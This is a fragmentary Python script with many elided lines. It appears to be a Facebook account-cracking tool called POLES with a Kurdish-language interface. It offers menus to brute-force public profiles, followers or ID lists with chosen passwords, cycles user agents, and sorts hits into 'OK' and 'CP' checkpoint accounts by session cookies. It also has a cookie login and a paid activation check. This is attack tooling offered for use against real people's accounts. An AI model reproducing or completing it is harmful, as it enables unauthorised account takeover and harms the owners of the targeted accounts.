...
def chk():
  ...
  try: 
    ...
    httpCaht = requests.get("://https://github.com/kurd4352/id_active/blob/main/kurd.txt").text 
    ...
    if id in httpCaht: 
      ...
      print("\033[0;96m Id kat active nya Tkaya bo Active krdn NAME bnera bo telegram @IM_ARYAz") 
...
\033[92;92m
╔══════════════════════════════════╗\033[1;92m
║(1)  Author  : MAM_SHEXA                      \033[1;92m                        
║(2)  Github  : SHEXA                    \033[1;99m                        
║(3)  Telegram : I4M_SHEXA             \033[1;95m                       
║(4) Facebook : SHEXA XOSHNAW      \033[1;91m                           
║(5) Version  : 8.0.1                          \033[1;90m                        
║(6) NRXE TOOL: 10$ KOREK         \033[1;92m                           
\033[1;92m╚═════════════════════════════════╝\033[1;92m
''')
# LOGIN
def login():
	try:
		...
		try:
			...
			li = '# Xatt Xawa😒, Dwbara Hall Bdawa'
...
def login_c():
	try:
		...
		cookie=input(f'%s[%s√%s]%s COOKIE DANE : '%(P,H,P,H))
		...
		print('%s[%s✔%s]%s Login successful run again \033[1;92m\033[1;92m python POLES.py \033[0m\033[1;94m'%(N,H,N,H));time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%s✘%s]%s Cookie Swtawa %s'%(x,k,x,m,x))
		exit()
# MAIN MENU
def menu(my_name,my_id):
	...
	os.system('clear')
	banner()
	print('        \n    [\033[1;92m\033[1;95m  DAXL BW   \033[0m\033[1;92m]\n')
	...
	try:
		...
		print("%s[%s✔%s]%s    :%s %s"%(H,P,H,P,K,gep['region']))
		print("%s[%s✔%s]%s  Ip      :%s %s\n"%(H,P,H,P,K,gep['ip']))
	
	except:
		print("%s[%s✔%s]%s Region :%s -"%(H,P,H,P,K))
		print("%s[%s✔%s]%s Ip :%s -"%(H,P,H,P,K))
	print('\n    [\033[1;92m\033[1;41m  POLES   \033[0m\033[1;96m]\n')
	print('%s[%s1%s]%s CRACK PUBLIC %s[%sON%s]'%(P,H,P,H,P,H,P))	
	print('%s[%s2%s]%s CRACK FOLLOWERS %s[%sON%s] \033[1;96m'%(P,H,P,H,P,H,P))	
	print('%s[%s3%s]%s CRACK BA FILE ok %s[%sON%s] \033[1;92m'%(P,H,P,H,P,H,P))	
	print('%s[%sA%s]%s CONTACT %s[%sOwner%s] \033[1;98m'%(P,H,P,H,P,H,P))
	...
	if MRBX in ['1','01']:
		...
		os.system('xdg-open https://t.me/cracker_SHEXA');menu(my_name,my_id)
	elif MRBX in ['B','b']:
...
def public():
	...
	try:
		...
		time.sleep(3)
		print('{k}😅NOT PUBLIC ID id bash nya ')
		follower()
	if jum<1:
...
def setting():
	os.system('clear')
	banner()
	cetak(('\t[bold cyan]          • POLES • [/bold cyan]'))
	print(' \n')

	print('(✬{ 1 }CRACK NEW ID \033[1;92m')

	print('[✔](2) CRACK FB KON\033[1;94m') 

	print('[✔](3) CRACK RAQAM ID\033[1;96m')
	...
	if hu in ['1','01']:
		...
		print('\n[\033[1;92m\033[1;41m  Choose Method    \033[0m\033[1;96m]\n')
		exit()
	clear()
	banner()
	...
	print(' (1) NEWROZ KOREK FTTH\033[1;92m')

	print(' (2) FASTLENK ZAIN\033[1;95m')

	print(' (3) XATE FRRE\033[1;96m')
	...
	banner()
	print('___\n')
	print('✧ ✧ Baxot Pass Dadaney?🤔( NAXER / BALE )')
	
	print(54*"_")
	pwplus=input('[•] HALBZHERA!? : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print('\n\x1b[1;92m%s[%sXXX%s]%s-----%s[%sXXX%s] '%(H,P,H,P,H,P,H,))
		print(' Use Passward Minimum 6 Digit')
		print('\n\x1b[1;92m%s[%sXXX%s]%s-----%s[%sXXX%s] '%(H,P,H,P,H,P,H,))
		pwku=input('[ POLES ]  Pass Dabne?! : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
def passwrd():
	...
	banner()
	os.system('echo -e " "')
	print("\x1b[1;96m  id 😅 : "+str(len(id)))
	print("\x1b[1;96m  cp Ba Vpn Bkanawa")

	print("\x1b[1;92m  Tkaya Kamek Chawareka")

	print(" \x1b[1;95m Bo Wastand CTRL + Z TO STOP")
	os.system('echo -e " "')
	...
	print(' CP : %s '%(cp))
	print('')
	print('[DA GARETAWA BO SARATA ]( B/N ) ? ')
	woi = input('[POLES] HALBZHERA  : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t[✔] LERA TAWAW BW {u} ')
		time.sleep(2)
		exit()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}[POLES]{P}[{k}{loop}{P}/{h}{len(id)}{P}]-{P}[{H}OK - {ok}{P}]-{P}[{k}CP - {cp}{x}]-[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[SHEXA]{P}[{asu}Mbasic{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}--{ok}-{P}]—{P}[{k}--{cp}-{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
...
def ceker(idf,pw):
	...
	try:
		...
		if len(opsi)==0:
			print('\r%s POLES ✧✧ Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s ✰SHEXA✰ %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s[MRBX]%s|%s ✰SHEXA✰ CP       %s'%(b,idf,pw,x))
	...
	for kes in akun:
		try:
			try:
				...
				time.sleep(2)
				print('\r%s[SHEXA]%s  Error      %s'%(b,kes,x))
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s[SHEXA]%s|%s > CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s POLES Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
					...
					print('\r%sSHEXA %s|%s✫ CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s[SHEXA]%s|%s✬ OK       %s'%(h,id,pw,x))
			else:
				print('\r%s SHEXA %s|%s ★★ ID       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# 😎😎😎'
...
def reg():
    ...
    banner()
    print ('')
    print ('                  [\033[1;94m\033[1;41m wait a minute \033[0m\033[1;92m]')
    time.sleep(1) 
    try:
    ...
    if to in r:
        ...
        os.system('xdg-open https://www.facebook.com/it.is.Masudvai.143')
        banner()
        print('      [\033[1;97m\033[1;41m  YOU NEED APPROVAL    \033[0m\033[1;92m]')
        print ('\n               YOUR KEY : \n' + to)
        print('      [\033[1;90m\033[1;41m YOUR KY    \033[0m\033[1;93m]')
        name = input("               Nawakat : ")
        input('                     [\033[1;97m\033[1;94m  CLICK INTER   \033[0m\033[1;96m]')
        time.sleep(3.5)
